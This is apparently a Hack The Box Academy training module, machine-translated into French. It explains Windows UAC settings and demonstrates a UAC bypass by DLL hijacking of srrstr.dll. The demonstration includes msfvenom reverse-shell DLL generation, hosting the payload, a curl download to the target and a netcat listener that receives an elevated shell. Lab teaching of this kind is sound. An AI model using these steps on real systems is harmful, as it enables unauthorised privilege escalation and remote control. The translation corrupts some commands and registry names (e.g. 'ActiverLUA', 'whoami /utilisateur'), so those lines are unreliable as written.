Contrôle de compte d'utilisateur
====================

* * * * *

[Contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une invite de consentement pour les activités élevées. Les applications ont différents niveaux d'"intégrité" et un programme avec un niveau élevé peut effectuer des tâches susceptibles de compromettre le système. Lorsque l'UAC est activé, les applications et les tâches s'exécutent toujours dans le contexte de sécurité d'un compte non administrateur, sauf si un administrateur autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système à exécuter. Il s'agit d'une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais qui n'est pas considérée comme une limite de sécurité.

Lorsque l'UAC est en place, un utilisateur peut se connecter à son système avec son compte d'utilisateur standard. Lorsque les processus sont lancés à l'aide d'un jeton d'utilisateur standard, ils peuvent effectuer des tâches en utilisant les droits accordés à un utilisateur standard. Certaines applications nécessitent des autorisations supplémentaires pour s'exécuter, et UAC peut fournir des droits d'accès supplémentaires au jeton pour qu'elles s'exécutent correctement.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l'UAC et inclut le processus de connexion, l'expérience utilisateur et l'architecture UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l'UAC spécifique à leur organisation au niveau local (à l'aide de secpol.msc), ou configuré et diffusé via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont discutés en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings ). Il existe 10 paramètres de stratégie de groupe qui peuvent être définis pour UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de stratégie de groupe | Clé de registre | Paramètre par défaut |
| --- | --- | --- |
| [Contrôle de compte d'utilisateur : mode d'approbation administrateur pour le compte administrateur intégré] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control -group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account) | FilterAdministratorToken | Désactivé |
| [Contrôle de compte d'utilisateur : autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account -control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | ActiverUIADesktopToggle | Désactivé |
| [Contrôle de compte d'utilisateur : comportement de l'invite d'élévation pour les administrateurs en mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account- control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode) | ConsentPromptBehaviorAdmin | Invite de consentement pour les binaires non-Windows |
| [Contrôle de compte d'utilisateur : comportement de l'invite d'élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group -policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users) | ConsentPromptBehaviorUser | Demande d'informations d'identification sur le bureau sécurisé |
| [Contrôle de compte d'utilisateur : détecter les installations d'applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group- policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation) | EnableInstallerDetection | Activé (par défaut pour la maison) Désactivé (par défaut pour l'entreprise) |
| [Contrôle de compte d'utilisateur : élever uniquement les exécutables signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group -policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated) | ValiderAdminCodeSignatures | Désactivé |
| [Contrôle de compte d'utilisateur : élever uniquement les applications UIAccess installées dans des emplacements sécurisés] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control -group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations) | ActiverSecureUIAPaths | Activé |
| [Contrôle de compte d'utilisateur : exécuter tous les administrateurs en mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group- policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode) | ActiverLUA | Activé |
| [Contrôle de compte d'utilisateur : basculez vers le bureau sécurisé lorsque vous demandez une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control- groupe-politique-et-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation) | PromptOnSecureDesktop | Activé |
| [Contrôle de compte d'utilisateur : virtualiser les échecs d'écriture de fichiers et de registre dans des emplacements par utilisateur] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account- control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations) | Activer la virtualisation | Activé |

[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)

![image](https://academy.hackthebox.com/storage/modules/67/uac.png)

L'UAC doit être activé, et bien qu'il n'empêche pas un attaquant d'obtenir des privilèges, c'est une étape supplémentaire qui peut ralentir ce processus et le forcer à devenir plus bruyant.

Le compte `administrateur RID 500 par défaut` fonctionne toujours au niveau obligatoire élevé. Lorsque le mode d'approbation administrateur (AAM) est activé, tous les nouveaux comptes d'administrateur que nous créons fonctionneront au niveau obligatoire moyen par défaut et se verront attribuer deux jetons d'accès distincts lors de la connexion. Dans l'exemple ci-dessous, le compte d'utilisateur `sarah` est dans les administrateurs groupe, mais cmd.exe s'exécute actuellement dans le contexte de leur jeton d'accès non privilégié.

#### Vérification de l'utilisateur actuel

Vérification de l'utilisateur actuel

```
C:\htb> whoami /utilisateur

INFORMATIONS DE L'UTILISATEUR
----------------

ID du nom d'utilisateur
================= ================================= =============
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002

```

#### Confirmation de l'appartenance au groupe d'administrateurs

Confirmation de l'appartenance au groupe d'administrateurs

```
C:\htb> administrateurs du groupe local net

Administrateurs de noms d'alias
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
mrb3n
sarah
La commande s'est terminée avec succès.

```

#### Examen des privilèges de l'utilisateur

Examen des privilèges de l'utilisateur

```
C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= =============== ========
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé

```

#### Confirmation de l'activation de l'UAC

Il n'y a pas de version en ligne de commande de l'invite de consentement de l'interface graphique, nous devrons donc contourner l'UAC pour exécuter des commandes avec notre jeton d'accès privilégié. Tout d'abord, vérifions si l'UAC est activé et, si oui, à quel niveau.

Confirmation de l'activation de l'UAC

```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ActiverLUA REG_DWORD 0x1

```

#### Vérification du niveau UAC

Vérification du niveau UAC

```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ConsentPromptBehaviorAdmin REG_DWORD 0x5

```

La valeur de `ConsentPromptBehaviorAdmin` est `0x5`, ce qui signifie que le niveau UAC le plus élevé de `Toujours notifier` est activé. Il y a moins de contournements UAC à ce niveau le plus élevé.

#### Vérification de la version de Windows

L'UAC contourne les failles de levier ou les fonctionnalités involontaires dans différentes versions de Windows. Examinons la version de Windows que nous cherchons à élever.

Vérification de la version de Windows

```
PS C:\htb> [environnement] ::OSVersion.Version

Révision de construction mineure majeure
----- ----- ----- --------
10 0 14393 0

```

Cela renvoie la version de build 14393, qui, à l'aide de [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, nous renvoie à la version `1607` de Windows.

![image](https://academy.hackthebox.com/storage/modules/67/build.png)

Le projet [UACME](https://github.com/hfiref0x/UACME) maintient une liste des contournements UAC, y compris des informations sur le numéro de build Windows concerné, la technique utilisée et si Microsoft a publié une mise à jour de sécurité pour y remédier. Utilisons la technique numéro 54, qui est censée fonctionner à partir de Windows 10 build 14393. Cette technique cible la version 32 bits du binaire à élévation automatique `SystemPropertiesAdvanced.exe`. Il existe de nombreux fichiers binaires de confiance que Windows permettra d'élever automatiquement sansNous avons besoin d'une invite de consentement UAC.

Selon [ce](https://egre55.github.io/system-properties-uac-bypass) article de blog, la version 32 bits de `SystemPropertiesAdvanced.exe` tente de charger la DLL inexistante srrstr.dll, qui est utilisé par la fonctionnalité de restauration du système.

Lors de la tentative de localisation d'une DLL, Windows utilisera l'ordre de recherche suivant.

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système `C:\Windows\System32` pour les systèmes 64 bits.
3. Le répertoire système 16 bits `C:\Windows\System` (non pris en charge sur les systèmes 64 bits)
4. Le répertoire Windows.
5. Tous les répertoires répertoriés dans la variable d'environnement PATH.

#### Examen de la variable de chemin

Examinons la variable de chemin à l'aide de la commande `cmd /c echo %PATH%`. Cela révèle les dossiers par défaut ci-dessous. Le dossier `WindowsApps` se trouve dans le profil de l'utilisateur et peut être modifié par l'utilisateur.

Examen de la variable de chemin

```
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32 ;
C:\Windows ;
C:\Windows\System32\Wbem ;
C:\Windows\System32\WindowsPowerShell\v1.0\ ;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps ;

```

Nous pouvons potentiellement contourner l'UAC en utilisant le piratage de DLL en plaçant une DLL `srrstr.dll` malveillante dans le dossier `WindowsApps` , qui sera chargée dans un contexte élevé.

#### Génération d'une DLL srrstr.dll malveillante

Tout d'abord, générons une DLL pour exécuter un reverse shell.

Génération d'une DLL srrstr.dll malveillante

```
dsgsec@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x86 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 324 octets
Taille finale du fichier dll : 5120 octets

```

Remarque : Dans l'exemple ci-dessus, nous avons spécifié notre adresse IP VPN tun0.

#### Démarrage du serveur HTTP Python sur l'hôte d'attaque

Copiez la DLL générée dans un dossier et configurez un mini serveur Web Python pour l'héberger.

Démarrage du serveur HTTP Python sur l'hôte d'attaque

```
dsgsec@htb[/htb]$ sudo python3 -m http.serveur 8080

```

#### Téléchargement de la cible DLL

Téléchargez la DLL malveillante sur le système cible et installez un écouteur `Netcat` sur notre machine d'attaque.

Téléchargement de la cible DLL

```
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

```

#### Démarrage de l'écouteur nc sur l'hôte d'attaque

Démarrage de nc Listener sur l'hôte d'attaque

```
dsgsec@htb[/htb]$ nc -lvnp 8443

```

#### Test de connexion

Si nous exécutons le fichier `srrstr.dll` malveillant, nous recevrons un shell indiquant les droits d'utilisateur normaux (UAC activé). Pour tester cela, nous pouvons exécuter la DLL à l'aide de `rundll32.exe` pour obtenir une connexion shell inversée.

Tester la connexion

```
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

```

Une fois la connexion rétablie, nous verrons les droits d'utilisateur normaux.

Tester la connexion

```
dsgsec@htb[/htb]$ nc -lnvp 8443

écoute sur [tout] 8443 ...

se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation 2016. Tous les droits sont réservés.

C:\Users\sarah> whoami /priv

whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= =============== ========
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé

```

#### Exécution de SystemPropertiesAdvanced.exe sur l'hôte cible

Maintenant, nous pouvons exécuter la version 32 bits de `SystemPropertiesAdvanced.exe` à partir de l'hôte cible.

Exécution de SystemPropertiesAdvanced.exe sur l'hôte cible

```
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

```

#### Réception de la connexion Retour

En revenant sur notre auditeur, nous devrions recevoir une connexion presque instantanément.

Réception de la connexion Retour

```
dsgsec@htb[/htb]$ nc -lvnp 8443

écoute sur [tout] 8443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation 2016. Tous les droits sont réservés.

C:\Windows\system32>whoami

qui suis je
winlpe-ws03\sarah

C:\Windows\system32>whoami /priv

whoami /priv
INFORMATIONS SUR LES PRIVILÈGES
----------------------
Nom du privilège Description État
======================================== ========= ================================================= ======= ========
SeIncreaseQuotaPrivilege Ajuster les quotas de mémoire pour un processus Désactivé
SeSecurityPrivilege Gérer l'audit et la sécuritéjournal désactivé
SeTakeOwnershipPrivilege S'approprier des fichiers ou d'autres objets Désactivé
SeLoadDriverPrivilege Charger et décharger les pilotes de périphérique Désactivé
Performances système du profil SeSystemProfilePrivilege Désactivé
SeSystemtimePrivilege Modifier l'heure du système Désactivé
Processus unique du profil SeProfileSingleProcessPrivilege Désactivé
SeIncreaseBasePriorityPrivilege Augmenter la priorité de planification Désactivé
SeCreatePagefilePrivilege Créer un fichier d'échange Désactivé
SeBackupPrivilege Sauvegarder des fichiers et des répertoires Désactivé
SeRestorePrivilege Restaurer les fichiers et les répertoires Désactivé
SeShutdownPrivilege Arrêter le système Désactivé
Programmes de débogage SeDebugPrivilege désactivés
SeSystemEnvironmentPrivilege Modifier les valeurs de l'environnement du micrologiciel Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeRemoteShutdownPrivilege Forcer l'arrêt à partir d'un système distant Désactivé
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeManageVolumePrivilege Effectuer des tâches de maintenance de volume Désactivé
SeImpersonatePrivilege Emprunter l'identité d'un client après l'authentification Activé
SeCreateGlobalPrivilege Créer des objets globaux Activé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé
SeCreateSymbolicLinkPrivilege Créer des liens symboliques Désactivé
SeDelegateSessionUserImpersonatePrivilege Obtenir un jeton d'emprunt d'identité pour un autre utilisateur dans la même session Désactivé

```

Cela réussit et nous recevons un shell élevé indiquant que nos privilèges sont disponibles et peuvent être activés si nécessaire.